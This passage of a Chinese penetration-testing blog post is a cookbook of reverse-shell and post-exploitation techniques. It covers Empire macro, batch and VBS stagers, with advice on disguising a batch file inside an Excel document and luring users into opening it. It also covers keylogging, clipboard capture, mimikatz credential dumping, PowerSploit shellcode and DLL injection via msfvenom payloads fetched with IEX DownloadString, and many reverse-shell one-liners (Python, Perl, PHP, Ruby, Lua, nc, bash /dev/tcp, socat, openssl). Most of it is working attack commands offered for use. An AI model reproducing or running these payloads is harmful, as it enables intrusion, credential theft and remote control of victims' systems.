+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Git clone https://github.com/EmpireProject/Empire</span><br></pre></td></tr></table></figure>
+
+<p>启动Empire</p>
+<p>设置监听器 选择渗透测试模块（设置参数àrun&#x2F;execute）  产生payload</p>
+<p>最后把payload在目标机上执行  反弹shell</p>
+<p><strong><em>*</em>*****2.5.******2 利用office宏定义反弹shell*</strong>*</p>
+<p>**Step 1:**我们首先查看一下Empire的帮助信息：help</p>
+<p>接着输入listeners设置监听器，后面跟上7中模式 </p>
+<p>选用http，然后execute</p>
+<p>注意：可以通过set Name shuteer 来设置该监听器的名称</p>
+<p>如果之前已经添加过监听器，后来添加的监听器要设置名字以及监听的端口</p>
+<p>set Name <em>listener_name</em> set Host <em>IP:port</em></p>
+<p><strong>Step 2：</strong>back退出当前环境，然后生成payload，使用usestager <em>moudle_name</em>，multi为通用模块，osx是MAC系统的模块，其余均为Windows系统的模块。 </p>
+<p>输入usestager windows&#x2F;macro shuteer(监听器的名字) #生成payload</p>
+<p>execute</p>
+<p>产看生成的payload</p>
+<p>生成&#x2F;tmp&#x2F;macro 攻击代码后，新建一个word 创建宏，注意：需要开启宏或者用户手动启用宏。开启宏设置：“文件”-“选项”-“信任中心”,选择“启用所有宏”。</p>
+<p>然后产生的payload添加到测试文档的宏中。</p>
+<p><strong>Step 3：</strong>诱导用户去打开该测试文档，然后就可kali终端中有接收到的测试数据</p>
+<p>进入反弹回来的会话中，使用interact命令连接主机，intetact DMEYHL1V（会话名字）</p>
+<p>Shell whoami查看当前用户 shell +命令</p>
+<p>Shell net user 获取系统用户</p>
+<p>sysinfo获取系统信息</p>
+<p>运行mimikatz，获取当前活动用户账号信息</p>
+<p>获取当前进程的ID：getpid      getuid  pwd  </p>
+<p>输入creds可以自动过滤、整理出获取的用户密码（有密文和明文）</p>
+<p><em><strong>*2.5.3 利用office OLE对象插入bat文件反弹shell*</strong></em></p>
+<p>Step 1：要想设置launcher_bat木马，需要输入usestager windows&#x2F;launcher_bat http(监听器的名称)</p>
+<p>Step 2：将产生的bat文件直接复制到靶机上运行，就可以看到反弹的shell</p>
+<p>获取系统运行的进程</p>
+<p>为了增加迷惑性，可以将批处理文件插入到office文档中，现创建一个excel表格，在excel中“插入”-“对象”-“由文件创建” 处，插入launcher.bat文件，可更改文件名称和图标，进行伪装，当诱导目标点击该文件，执行后，即可成功反弹shell。</p>
+<p>*<strong>2.5.4 Empire产生VBS木马反弹shell</strong></p>
+<p>usestager windows&#x2F;launcher_vbs</p>
+<p>execute</p>
+<p>在靶机上运行该VBS脚本即可</p>
+<p>注意：如果要生成基于VBS的Powershell代码，设置完listener和userstager之后，不用输入execute，直接输入back，然后输入Launcher powershell shuteer（监听器的名字）</p>
+<p><strong>2.5.5 信息收集</strong></p>
+<p>输入usemodule collection ，然后按TAB键查询完整的列表</p>
+<p><em><strong>2.5.5 .1 截屏</strong></em></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(Empire: PDGNXFEK) &gt; usemodule collection/screenshot(Empire: powershell/collection/screenshot) &gt; execute</span><br></pre></td></tr></table></figure>
+
+<p><em><strong>2.5.5 .2</strong></em> 键盘记录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Empire: PDGNXFEK) &gt; usemodule collection/keylogger(Empire: powershell/collection/keylogger) &gt; run</span><br></pre></td></tr></table></figure>
+
+<p>就会在agent.log的同级目录中生成keystrokes.txt，打开该文件便可以看到记录的数据！</p>
+<p>关闭键盘记录：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BackJobsJobs kill JOB_name</span><br></pre></td></tr></table></figure>
+
+<p><strong>2.5.5 .3</strong> 剪贴板记录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(Empire: PDGNXFEK) &gt; usemodule collection/clipboard_monitor(Empire: powershell/collection/clipboard_monitor) &gt; execute</span><br></pre></td></tr></table></figure>
+
+<p>然后目标主机上复制一句话，停止方法如上所示。</p>
+<p><strong>2.5.5 .4</strong> 查看域共享文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FEK) &gt; usemodule  situational_awareness/network/powerview/share_finder(Empire: powershell/situational_awareness/network/powerview/share_finder) &gt; execute</span><br></pre></td></tr></table></figure>
+
+<p>注意：当前环境没有域，后面讲完域渗透之后可以测试</p>
+<p><strong>2.5.5 .5</strong> 目标主机信息（域环境）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(Empire: PDGNXFEK) &gt; usemodule situational_awareness/host/winenum(Empire: powershell/situational_awareness/host/winenum) &gt; run</span><br></pre></td></tr></table></figure>
+
+<p>或者使用如下模块：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(Empire: PDGNXFEK) &gt; usemodule situational_awareness/host/computerdetails*(Empire: powershell/situational_awareness/host/computerdetails) &gt; run</span><br></pre></td></tr></table></figure>
+
+<p><strong>2.5.5 .6</strong> ARP扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(Empire: PDGNXFEK) &gt; usemodule situational_awareness/network/arpscan(Empire: powershell/situational_awareness/network/arpscan) &gt;</span><br></pre></td></tr></table></figure>
+
+<p>然后需要设置扫描的范围：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set Range 192.168.1.1-192.168.1.254</span><br></pre></td></tr></table></figure>
+
+<p><strong>2.5.5 .7</strong> DNS信息获取</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(Empire: PDGNXFEK) &gt; set range 1usemodule situational_awareness/network/reverse_dns(Empire: powershell/situational_awareness/network/reverse_dns) &gt; run</span><br></pre></td></tr></table></figure>
+
+<p>或者使用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(Empire: PDGNXFEK) &gt; usemodule situational_awareness/host/dnsserver(Empire: powershell/situational_awareness/host/dnsserver) &gt; run</span><br></pre></td></tr></table></figure>
+
+<p><strong><em>*</em>*****2.5.******5 .8*</strong>* 查找域控登录服务器IP</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(Empire: PDGNXFEK) &gt; usemodule situational_awareness/network/powerview/user_hunter(Empire: powershell/situational_awareness/network/powerview/user_hunter) &gt; execute</span><br></pre></td></tr></table></figure>
+
+<p><strong><em>*</em>*****2.5.******5 .9*</strong>* 本地管理组访问模块</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Empire: PDGNXFEK) &gt; usemodule situational_awareness/network/powerview/find_localadmin_access(Empire: powershell/situational_awareness/network/powerview/find_localadmin_access) &gt; run\</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong><em>*</em>*****2.5.******5 .10*</strong>* 获取域控制器</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(Empire: PDGNXFEK) &gt; usemodule susemodule situational_awareness/network/powerview/get_domain_controller(Empire: powershell/situational_awareness/network/powerview/get_domain_controller) &gt; run</span><br></pre></td></tr></table></figure>
+
+
+
+<h6 id="2-6、PowerSploit"><a href="#2-6、PowerSploit" class="headerlink" title="2.6、PowerSploit**"></a><strong>2.6</strong>、PowerSploit**</h6><p>PowerSploit是又一款基于powershell的后渗透攻击框架。PowerSploit包括Inject-Dll(注入dll到指定进程)、Inject-Shellcode（注入shellcode到执行进程）等功能。</p>
+<p>利用msfvenom、metasploit和PowerSploit中的Invoke-DllInjection.ps1 实现dll注入，反弹shell.</p>
+<p><strong>2.6.1 执行ShellCode反弹Meterpreter Shell</strong></p>
+<p>注意：此实验失败（看脸，有的机器行，有的不行）</p>
+<p><strong>Step 1</strong>：下载PowerSploit到本地，使用python搭建简易服务器（python -m SimpleHTTPServer 9889）</p>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="http://192.168.1.18:9889/CodeExecution/Invoke-Shellcode.ps1">http://192.168.1.18:9889/CodeExecution/Invoke-Shellcode.ps1</a></p>
+<p><strong>Step 2</strong>：MSF中选择reverse_tcp模块进行反弹</p>
+<p>然后使用msfvenom命令生成powershell脚本木马</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.28 lport=4444 -f powershell -o ./test</span><br></pre></td></tr></table></figure>
+
+
+
+<p>将生成的test文件复制到python搭建的web服务器中，于是有：</p>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="http://192.168.1.18:9889/test">http://192.168.1.18:9889/test</a></p>
+<p>**step 3:**在目标机上执行powershell下载脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX (New-Object System.Net.Webclient).DownloadString(&#x27;http://192.168.1.18:9889/CodeExecution/Invoke-Shellcode.ps1&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>下载MSF产生的木马文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IEX (New-Object System.Net.Webclient).DownloadString(&#x27;http://192.168.1.18:9889/test&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>最后运行木马文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Shellcode -Shellcode ($buf)  -Force</span><br></pre></td></tr></table></figure>
+
+<p>其中-shellcode()b表示执行恶意代码的函数，$buf是test文件中恶意代码</p>
+<p>最后就能在MSF看到反弹的shell</p>
+<p><strong><em>*</em>***2.6.****2 DLL注入反弹shell*</strong>*</p>
+<p>使用模块的是Invoke-DllInjection.ps1，它是一个DLL注入的脚本</p>
+<p>首先还是要下载脚本：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX (New-Object System.Net.Webclient).DownloadString(&#x27;http://192.168.1.18:9889/CodeExecution/Invoke-DllInjection.ps1 &#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>然后在kali中生成一个DLL注入脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.28 lport=6667 -f dll -o ./pentest.dll</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.129 lport=6667 -f dll  -a x64 --platform windows -o  ./test.dll</span><br></pre></td></tr></table></figure>
+
+<p>接着将生成好的DLL文件复制python服务器中，于是有：</p>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="http://192.168.1.18:9889/pentest.dll">http://192.168.1.18:9889/pentest.dll</a></p>
+<p>然后在目标机上下载还文件到C盘</p>
+<p>在目标机上启动一个进程进行DLL注入，可以后续的注入更加隐蔽，使用如下的命令新建一个名为notepad.exe的隐蔽进程 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Start-Process c:\windows\system32\notepad.exe -WindowStyle Hidden</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist|findstr notepad.exe</span><br></pre></td></tr></table></figure>
+
+<p>然后执行下面的代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX (New-Object System.Net.Webclient).DownloadString(&#x27;http://192.168.1.18:9889/CodeExecution/Invoke-DllInjection.ps1 &#x27;);Invoke-DllInjection -ProcessID 1124 -Dll c:\pentest.dll</span><br></pre></td></tr></table></figure>
+
+<p>最后在MSF能看到反弹的shell。</p>
+<h1 id="常见shell反弹方式（二）"><a href="#常见shell反弹方式（二）" class="headerlink" title="常见shell反弹方式（二）"></a>常见shell反弹方式（二）</h1><p>今天继续写第二部分：</p>
+<p>今日目录：</p>
+<h5 id="3、编程语言反弹shell"><a href="#3、编程语言反弹shell" class="headerlink" title="3、编程语言反弹shell"></a>3、编程语言反弹shell</h5><h6 id="3-1、python"><a href="#3-1、python" class="headerlink" title="3.1、python"></a>3.1、python</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.2.101&quot;,1001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python 正向链接 攻击者主动链接  nc -nv 目标机ip  1025端口</span><br><span class="line">python -c &quot;exec(&#x27;aW1wb3J0IHNvY2tldCxvcyxzeXMKcz1zb2NrZXQuc29ja2V0KCkKcy5iaW5kKCgiIiwxMDI1KSkKcy5saXN0ZW4oMSkKKGMsYSk9cy5hY2NlcHQoKQp3aGlsZSAxOgogZD1jLnJlY3YoNTEyKQogaWYgJ2V4aXQnIGluIGQ6CiAgcy5jbG9zZSgpCiAgc3lzLmV4aXQoMCkKIHI9b3MucG9wZW4oZCkucmVhZCgpCiBjLnNlbmQocikK&#x27;.decode(&#x27;base64&#x27;))”</span><br></pre></td></tr></table></figure>
+
+<h6 id="3-2、perl"><a href="#3-2、perl" class="headerlink" title="3.2、perl"></a>3.2、perl</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e &#x27;use Socket;$i=&quot;192.168.40.1&quot;;$p=8999;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;3.2 perl</span><br></pre></td></tr></table></figure>
+
+<h6 id="3-3-php"><a href="#3-3-php" class="headerlink" title="3.3 php"></a><strong>3.3</strong> <strong>php</strong></h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r &#x27;$sock=fsockopen(&quot;192.168.40.1&quot;,8999);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br></pre></td></tr></table></figure>
+
+<h6 id="3-4-java"><a href="#3-4-java" class="headerlink" title="3.4 java"></a><strong>3.4</strong> <strong>java</strong></h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r = Runtime.getRuntime()p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/192.168.40.1/1234;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])p.waitFor()</span><br></pre></td></tr></table></figure>
+
+<h6 id="3-4-ruby"><a href="#3-4-ruby" class="headerlink" title="3.4 ruby"></a><strong>3.4</strong> <strong>ruby</strong></h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e &#x27;f=TCPSocket.open(&quot;192.168.40.1&quot;,1234).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#x27;</span><br></pre></td></tr></table></figure>
+
+<h6 id="3-5-lua"><a href="#3-5-lua" class="headerlink" title="3.5. lua"></a><strong>3.5.</strong> <strong>lua</strong></h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lua -e &quot;require(&#x27;socket&#x27;);require(&#x27;os&#x27;);t=socket.tcp();t:connect(&#x27;192.168.40.1&#x27;,&#x27;1234&#x27;);os.execute(&#x27;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#x27;);&quot;</span><br></pre></td></tr></table></figure>
+
+<h5 id="4、Nc-反弹shell"><a href="#4、Nc-反弹shell" class="headerlink" title="4、Nc 反弹shell"></a>4、Nc 反弹shell</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">有-e 模式：nc -e /bin/sh 192.168.40.1 1234</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">无-e 模式：rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.40.1 1234 &gt;/tmp/f（FIFO文件）</span><br></pre></td></tr></table></figure>
+
+<h5 id="5、SSL-反弹shell-加密-目标机反弹shell-攻击者监听端口-nc-lvnp-1234"><a href="#5、SSL-反弹shell-加密-目标机反弹shell-攻击者监听端口-nc-lvnp-1234" class="headerlink" title="5、SSL 反弹shell(加密)目标机反弹shell 攻击者监听端口 nc -lvnp 1234"></a><strong>5、SSL 反弹shell(加密)目标机反弹shell</strong> <strong>攻击者监听端口 nc</strong> <strong>-lvnp 1234</strong></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Hacker:</span><br><span class="line">生成证书：openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes</span><br><span class="line">使用证书加密链路并监听端口：openssl s_server -quiet -key key.pem -cert cert.pem -port 8888</span><br><span class="line">Target:</span><br><span class="line">mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect 192.168.198.200:8888 &gt; /tmp/s; rm /tmp/s</span><br></pre></td></tr></table></figure>
+
+<h5 id="6、Socat反弹shell"><a href="#6、Socat反弹shell" class="headerlink" title="6、Socat反弹shell"></a><strong>6、</strong>Socat反弹shell</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">VPS: socat TCP-LISTEN:12345 –</span><br><span class="line">Target：</span><br><span class="line"># wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat   # 第一步：下载socat到/tmp目录下</span><br><span class="line"># chmod 755 /tmp/socat  </span><br><span class="line">/tmp/socat exec:&#x27;bash -li&#x27;,pty,stderr,setsid,sigint,sane tcp:192.168.31.174：12345</span><br></pre></td></tr></table></figure>
+
+<h5 id="7、不使用nc来反弹shell"><a href="#7、不使用nc来反弹shell" class="headerlink" title="7、不使用nc来反弹shell"></a><strong>7、</strong>不使用nc来反弹shell</h5><p>不使用nc来反弹shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 8080</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -i &gt; /dev/tcp/173.214.173.151/8080 0&lt;&amp;1 2&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mknod backpipe p &amp;&amp; telnet 192.168.40.1 1234 0&lt;backpipe | /bin/bash 1&gt;backpipe</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet 192.168.40.1 1234 | /bin/bash | telnet 192.168.40.1 2345 (需要在攻击者PC上监听两个端口：1234 2345，1234 输入命令， 2345 输出)</span><br></pre></td></tr></table></figure>
+
+<h5 id="8、telnet反弹shell"><a href="#8、telnet反弹shell" class="headerlink" title="8、telnet反弹shell"></a><strong>8、</strong>telnet反弹shell</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">（1）telnet vpsIP 端口1 | /bin/sh | telnet vpsIP 端口2（2）nc开两个终端，同时监听两个端口，一个端口用于输入命令，另一个端口用于显示结果。</span><br></pre></td></tr></table></figure>
+
+<p>上述的反弹shell的命令时需要在肉鸡中执行，借助于webshell的权限来执行。</p>
+<p>攻击者需要执行的命令是：nc -lvvp 8080</p>
+<h5 id="9、注意"><a href="#9、注意" class="headerlink" title="9、注意"></a>9、注意</h5><p>反弹回来的shell不是TTY模式，可以执行：python -c ‘import pty; pty.spawn(“&#x2F;bin&#x2F;bash”)’</p>
+<p>www-data@me:&#x2F;tmp$</p>
+<p>www-data：当前用户</p>
+<p>me：主机名</p>
+<p>&#x2F;tmp：当前工作目录</p>
+<p>$:表示当前用户是一个普通用户</p>
+<p>#:表示是root</p>
+</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a></div><div class="post_share"><div class="social-share" data-image="/img/backup.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="/js/social-share.min.css" media="print" onload="this.media='all'"><script src="/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechat.jpg" target="_blank"><img class="post-qr-code-img" src="/img/wechat.jpg" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="/img/alipay.jpg" target="_blank"><img class="post-qr-code-img" src="/img/alipay.jpg" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/4fac5a8f.html"><img class="prev-cover" src="/img/backup.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">微信小程序渗透</div></div></a></div><div class="next-post pull-right"><a href="/posts/1962ff09.html"><img class="next-cover" src="/img/backup.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">常用一句话木马</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/posts/a83843a4.html" title="MSSQL不出网文件落地上线方式"><img class="cover" src="/img/backup.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-11-03</div><div class="title">MSSQL不出网文件落地上线方式</div></div></a></div><div><a href="/posts/8822d497.html" title="优秀靶机推荐"><img class="cover" src="/img/backup.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-11-03</div><div class="title">优秀靶机推荐</div></div></a></div><div><a href="/posts/dad1caf4.html" title="msf及socks代理转发"><img class="cover" src="/img/backup.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-11-03</div><div class="title">msf及socks代理转发</div></div></a></div><div><a href="/posts/721e2121.html" title="内网渗透常用命令"><img class="cover" src="/img/backup.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-11-03</div><div class="title">内网渗透常用命令</div></div></a></div><div><a href="/posts/169a3c2d.html" title="利用goproxy http上线不出网主机"><img class="cover" src="/img/backup.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-11-03</div><div class="title">利用goproxy http上线不出网主机</div></div></a></div><div><a href="/posts/9663dae0.html" title="域内信息收集命令"><img class="cover" src="/img/backup.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-11-03</div><div class="title">域内信息收集命令</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#windows-x2F-linux%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">1.</span> <span class="toc-text">windows&#x2F;linux反弹shell</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1%E3%80%81bash%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">1.1.</span> <span class="toc-text">1、bash反弹shell</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2%E3%80%81Powershell%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">1.2.</span> <span class="toc-text">2、Powershell反弹shell</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#2-1%EF%BC%89Powershell%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.2.1.</span> <span class="toc-text">2.1）Powershell介绍</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#2-2%E3%80%81Powercat%E5%8F%8D%E5%BC%B9TCP-shell"><span class="toc-number">1.2.2.</span> <span class="toc-text">2.2、Powercat反弹TCP - shell</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#2-3%E3%80%81nishang%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">1.2.3.</span> <span class="toc-text">2.3、nishang反弹shell</span></a></li><li class="toc-item toc-level-6"><a class="toc-link"><span class="toc-number">1.2.4.</span> <span class="toc-text"></span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#2-5%E3%80%81Empire-%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">1.2.5.</span> <span class="toc-text">2.5、Empire 反弹shell</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#2-6%E3%80%81PowerSploit"><span class="toc-number">1.2.6.</span> <span class="toc-text">2.6、PowerSploit**</span></a></li></ol></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81shell%E5%8F%8D%E5%BC%B9%E6%96%B9%E5%BC%8F%EF%BC%88%E4%BA%8C%EF%BC%89"><span class="toc-number"></span> <span class="toc-text">常见shell反弹方式（二）</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#3%E3%80%81%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">0.1.</span> <span class="toc-text">3、编程语言反弹shell</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#3-1%E3%80%81python"><span class="toc-number">0.1.1.</span> <span class="toc-text">3.1、python</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#3-2%E3%80%81perl"><span class="toc-number">0.1.2.</span> <span class="toc-text">3.2、perl</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#3-3-php"><span class="toc-number">0.1.3.</span> <span class="toc-text">3.3 php</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#3-4-java"><span class="toc-number">0.1.4.</span> <span class="toc-text">3.4 java</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#3-4-ruby"><span class="toc-number">0.1.5.</span> <span class="toc-text">3.4 ruby</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#3-5-lua"><span class="toc-number">0.1.6.</span> <span class="toc-text">3.5. lua</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4%E3%80%81Nc-%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">0.2.</span> <span class="toc-text">4、Nc 反弹shell</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" 